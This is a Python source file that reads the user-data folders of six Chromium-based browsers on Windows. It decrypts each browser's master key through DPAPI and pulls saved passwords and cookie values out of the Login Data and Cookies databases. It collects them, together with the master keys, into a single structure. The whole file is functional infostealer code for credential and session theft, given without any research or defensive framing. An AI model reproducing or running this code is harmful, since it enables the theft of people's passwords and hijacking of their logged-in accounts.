import os
import json
import sqlite3
import shutil
import tempfile
from pathlib import Path

CHROMIUM_PATHS = {
    "Chrome": [os.environ.get("LOCALAPPDATA", ""), "Google", "Chrome", "User Data"],
    "Edge": [os.environ.get("LOCALAPPDATA", ""), "Microsoft", "Edge", "User Data"],
    "Brave": [os.environ.get("LOCALAPPDATA", ""), "BraveSoftware", "Brave-Browser", "User Data"],
    "Opera": [os.environ.get("APPDATA", ""), "Opera Software", "Opera Stable"],
    "Opera GX": [os.environ.get("APPDATA", ""), "Opera Software", "Opera GX Stable"],
    "Vivaldi": [os.environ.get("LOCALAPPDATA", ""), "Vivaldi", "User Data"],
}


def get_master_key(user_data: str) -> bytes | None:
    path = os.path.join(user_data, "Local State")
    if not os.path.exists(path):
        return None
    try:
        with open(path) as f:
            state = json.load(f)
        encrypted_key = state.get("os_crypt", {}).get("encrypted_key")
        if not encrypted_key:
            return None
        raw = bytes.fromhex(encrypted_key[5:]) if encrypted_key.startswith("5") else eval(f"b'{encrypted_key}'")
        import win32crypt
        return win32crypt.CryptUnprotectData(raw, None, None, None, 0)[1]
    except Exception:
        return None


def decrypt_chromium_value(value: bytes, master_key: bytes) -> str | None:
    if not value or value[:3] == b"v10" or value[:3] == b"v11":
        try:
            from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
            nonce, ciphertext = value[3:15], value[15:-16]
            cipher = Cipher(algorithms.AES(master_key), modes.GCM(nonce, value[-16:]))
            decryptor = cipher.decryptor()
            return (decryptor.update(ciphertext) + decryptor.finalize()).decode("utf-8")
        except Exception:
            pass
    try:
        import win32crypt
        return win32crypt.CryptUnprotectData(value, None, None, None, 0)[1].decode("utf-8")
    except Exception:
        return None


def extract_chromium_login(browser: str, profile: str, master_key: bytes) -> list[dict]:
    db_path = os.path.join(profile, "Login Data")
    if not os.path.exists(db_path):
        return []
    tmp = tempfile.mktemp(suffix=".db")
    shutil.copy2(db_path, tmp)
    results = []
    try:
        conn = sqlite3.connect(tmp)
        for row in conn.execute("SELECT origin_url, username_value, password_value FROM logins"):
            url, user, pwd_enc = row
            pwd = decrypt_chromium_value(pwd_enc, master_key)
            results.append({"browser": browser, "type": "login", "url": url, "username": user, "password": pwd})
        conn.close()
    except Exception:
        pass
    finally:
        try:
            os.remove(tmp)
        except Exception:
            pass
    return results


def extract_chromium_cookies(browser: str, profile: str, master_key: bytes) -> list[dict]:
    db_path = os.path.join(profile, "Network", "Cookies")
    if not os.path.exists(db_path):
        alt = os.path.join(profile, "Cookies")
        if not os.path.exists(alt):
            return []
        db_path = alt
    tmp = tempfile.mktemp(suffix=".db")
    shutil.copy2(db_path, tmp)
    results = []
    try:
        conn = sqlite3.connect(tmp)
        for row in conn.execute("SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies"):
            host, name, path, val_enc, expires = row
            val = decrypt_chromium_value(val_enc, master_key)
            results.append({"browser": browser, "type": "cookie", "host": host, "name": name, "path": path, "value": val, "expires": expires})
        conn.close()
    except Exception:
        pass
    finally:
        try:
            os.remove(tmp)
        except Exception:
            pass
    return results


def extract_chromium_all() -> dict:
    data = {"logins": [], "cookies": [], "profiles": []}
    for browser, parts in CHROMIUM_PATHS.items():
        user_data = os.path.join(*parts)
        if not os.path.exists(user_data):
            continue
        master = get_master_key(user_data)
        if not master:
            continue
        profiles = [p for p in os.listdir(user_data) if p.startswith(("Default", "Profile "))]
        if not profiles:
            profiles = ["Default"]
        for profile in profiles:
            profile_path = os.path.join(user_data, profile)
            if not os.path.isdir(profile_path):
                continue
            data["logins"].extend(extract_chromium_login(browser, profile_path, master))
            data["cookies"].extend(extract_chromium_cookies(browser, profile_path, master))
            data["profiles"].append({"browser": browser, "profile": profile, "master_key": master.hex()})
    return data
